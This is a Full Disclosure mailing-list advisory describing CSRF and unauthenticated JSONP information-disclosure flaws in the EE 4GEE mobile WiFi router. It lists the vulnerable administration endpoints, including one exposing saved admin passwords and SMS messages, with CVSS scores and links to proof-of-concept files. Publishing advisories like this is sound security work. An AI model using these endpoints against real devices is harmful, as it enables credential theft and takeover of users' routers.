CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 7.1
- High).

Author: James Hemmings - security () jameshemmings co uk
Reference(s):
[1]
<https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities>

-------------------------------------------------
Cross Site Request Forgery (CSRF) - Multiple:
-------------------------------------------------
Attack Type: Remote
Impact: Code Execution
Affected Components:
<http://192.168.1.1/goform/AddNewProfile?rand=0.376065695742409>
<http://192.168.1.1/goform/setWanDisconnect?rand=0.6988130822240772>
<http://192.168.1.1/goform/setSMSAutoRedirectSetting?rand=0.9003361879232169>
<http://192.168.1.1/goform/setReset?rand=0.021764703082234105>
<http://192.168.1.1/goform/uploadBackupSettings>

Attack Vectors: An attacker could attempt to trick users into accessing
malicious CSRF payload URLs, which would allow an attacker to execute
privileged functions such as device reset, device reboot, internet
connection and disconnection, SMS message redirection and binary
configuration file upload, which would allow modification of all device
settings. Addtionally, this exploit can be chained together using other
vulnerabilities discovered to be remotely exploitable over SMS, using
Stored Cross Site Scripting (XSS).

Vulnerability Description: The 4GEE Mobile WiFi Router is vulnerable to
multiple Cross Site Request Forgery (CSRF) vulnerabilities within
various router administration web-pages, due to the lack of robust
request verification tokens within requests. An attacker could persuade
an authenticated user to visit a malicious website using phishing and/or
social engineering techniques to send an CSRF request to the web
application, thus executing the privileged function as the authenticated
user. In this case, due to the lack of authentication on certain
privileged functions, authentication may not be necessary.

The following web-pages were identified to be vulnerable to Cross Site
Request Forgery (CSRF) attacks:

AddNewProfile [2].
setWanDisconnect [3].
setSMSAutoRedirectSetting [4].
setReset [5].
uploadBackupSettings [6].

CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 6.8
- Medium).

Author: James Hemmings - security () jameshemmings co uk
Reference(s):
[1]
<https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities>

[2]
<https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/AddProfileCSRFXSSPoc.html>

[3]
<https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFInternetDCPoC.html>

[4]
<https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocRedirectSMS.html>

[5]
<https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocResetDefaults.html>

[6]
<https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/uploadBinarySettingsCSRFPoC.html>

-------------------------------------------------
JSONP Sensitive Information Disclosure - Multiple
-------------------------------------------------
Attack Type: Remote
Impact: Information Disclosure
Affected Components:
<http://192.168.1.1/goform/getPasswordSaveInfo>
<http://192.168.1.1/goform/getSingleSMSReport?rand=0.133713371337>
<http://192.168.1.1/goform/getSingleSMS?sms_id=1&rand=0.133713371337>
<http://192.168.1.1/goform/getSMSStoreState>
<http://192.168.1.1/goform/getSMSAutoRedirectSetting>
<http://192.168.1.1/goform/getSysteminfo>
<http://192.168.1.1/goform/getUsbIP?rand=0.13371337>

Attack Vectors: An attacker on the local network could escalate
privileges from unauthenticated user, to authenticated administrative
user by accessing the saved admin credentials within the JSONP endpoint.
Additionally, an attacker could access network configuration data and
SMS messages without authentication.

Vulnerability Description: The 4GEE Mobile WiFi Router is vulnerable to
multiple JSONP information disclosure vulnerabilities within various
endpoints which retrieve and/or set data. The JSONP endpoints allow for
unauthenticated information disclosure of sensitive configuration data,
settings, administration passwords and SMS messages, due to the lack of
robust and effective access control. An attacker could view such
unauthenticated endpoints via the local WiFi network to gain access to
the administration credentials, router configuration and/or SMS messages.

CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 8.1
- High).

Author: James Hemmings - security () jameshemmings co uk
Reference(s):
[1]
<https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities>

-------------------------------------------------
Disclaimer
-------------------------------------------------
The information in the advisory is believed to be accurate at the time
of publishing based on currently available information. Use of the
information constitutes acceptance for use in an AS IS condition. There
are no warranties with regard to this information. Neither the author
nor the publisher accepts any liability for any direct, indirect, or
consequential loss or damage arising from use of, or reliance on, this
information.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](53)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

### Current thread:

* **EE 4GEE Multiple Security Vulnerabilities Advisory (CSRF/Stored XSS/JSONP)** *James Hemmings (Security) (Sep 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


